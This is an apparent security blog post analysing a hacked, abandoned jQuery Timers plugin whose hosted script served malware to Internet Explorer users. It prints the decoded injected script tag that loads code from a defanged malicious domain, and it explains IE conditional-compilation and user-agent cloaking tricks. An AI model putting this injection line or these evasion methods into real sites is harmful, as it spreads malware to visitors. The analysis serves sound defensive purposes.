@@ -1,0 +1,41 @@
+The Dangers of Hosted Scripts – Hacked jQuery Timers
+
+Google blacklisted a client’s website claiming that malicious content was being displayed from “forogozoropoto(dot)2waky (dot)com”.
+A scan didn’t reveal anything suspicious. The next step was to check all third-party scripts on the website. Soon we found the offending script. It was hxxp://jquery .offput .ca/js/jquery.timers.js – a jQuery Timers plugin that was moderately popular 5-6 years ago.
+Right now, the jquery.offput.ca site is hacked. The home page appears to be blank, but it contains a few hidden links, one of which leads to a pharma spam doorway on another hacked site:
+
+All JavaScript files on the website contain malicious code.
+
+The plugin script jquery.timers.js is no exception (note the first line of code):
+Infected jquery.timers.js code
+The Payload
+The malware in the JavaScript files is quite interesting.
+First of all, the obfuscated part decodes to:
+<script src="hxxp://forogozoropoto(dot)2waky(dot)com/7"></script>
+So, we know this is definitely the source of the problem.
+Next, you may have noticed this construction:
+if(/*@cc_on!@*/false){malicious code}
+Most browsers ignore the comment and never execute the malicious code, taking it as:
+if(false){malicious code}
+Internet Explorer is different. It interprets the comment as a conditional compilation statement and considers everything between /*@cc_on and @*/ as executable JavaScript. In this case, IE will see the injected code as:
+if(!false){malicious code}
+It will always execute the malicious code, due to the inclusion of the commented “!” character.
+This IE-only, conditional compilation hack will prevent the forogozoropoto(dot)2waky(dot)com  script from loading in non-IE browsers, even if using an IE User-Agent string. This means that if you are using, say, a Linux sandbox with a browser that pretends to be Internet Explorer, and then monitor the HTTP traffic — you will not see any requests to forogozoropoto(dot)2waky(dot)com.
+One more interesting thing here is that hxxp://jquery.offput.ca/js/jquery.timers.js only contains the malicious code if you request it using an IE User-Agent. For any other browsers, it returns unmodified code of the jQuery Timers plugin. This looks like either a server-level infection that patches JavaScript responses on-the-fly for qualifying requests, or hackers changed the handler of JavaScript files, making them executable by PHP (e.g. using AddHandler and php_value auto_prepend_file in .htaccesss ).
+What Happened to the jQuery Timers Plugin?
+After the initial release and a few years of plugin support, the developer lost interest and abandoned the jquery.offput.ca site. The page says the plugin has moved to the official jQuery plugin repository, and all updates will be available there only:
+jQuery timers moved
+However, the repository URL is redirecting to jQuery.com, and it can’t be found using the search function. I suppose that the plugin has been completely abandoned, only living in local copies on some websites, and as as the hacked original version on the jquery.offput.ca site.
+The Risks of Using Hosted Scripts
+This is neither the first abandoned script, nor the last. Thousands of developers create plugins for jQuery. Many develop their own libraries. Some of those libraries become really popular, but there is no guarantee that developers will remain committed to supporting their software forever.
+Of course, when you find some cool new script, you might want to do some tests linking directly to the script on the developer’s website — it’s fast, it works on any computer, and you don’t have to worry about serving extra JavaScript files — just focus on your own code. However, what works during the test stage is not always a great idea for a live public site.
+Consider these potential situations and outcomes:
+
+The plugin site is temporarily down (e.g. maintenance or server problem) — your site is broken.
+The plugin author updated the .JS file with a buggy or incompatible version of the plugin – your site is broken.
+The plugin author abandons the site (the domain expires) or moves the plugin to a different domain — your site is broken.
+The plugin site gets hacked and some malicious code is injected into the plugin file — your site is spreading malware to your visitors.
+
+There are plenty of risks connected to using scripts from third-party websites. As a web developer, you should generally avoid this practice. The only reasonable exception is using JavaScript libraries from trusted CDNs (e.g. Google Hosted Libraries). You can be sure that the CDN will guarantee integrity and availability of the files you need for a reasonably long time. All the rest should be hosted on servers that you control.
+Please review your site code. If it still uses the jQuery Timers plugin, make sure to use a local version (you can get a clean version here) and don’t link to the infected jquery.timers.js file on the jquery.offput.ca site.
+If you see any other scripts linked directly to third-party websites, you might want to consider serving those scripts directly from your site, or from a trusted CDN. This will prove to be a more reliable and secure solution.
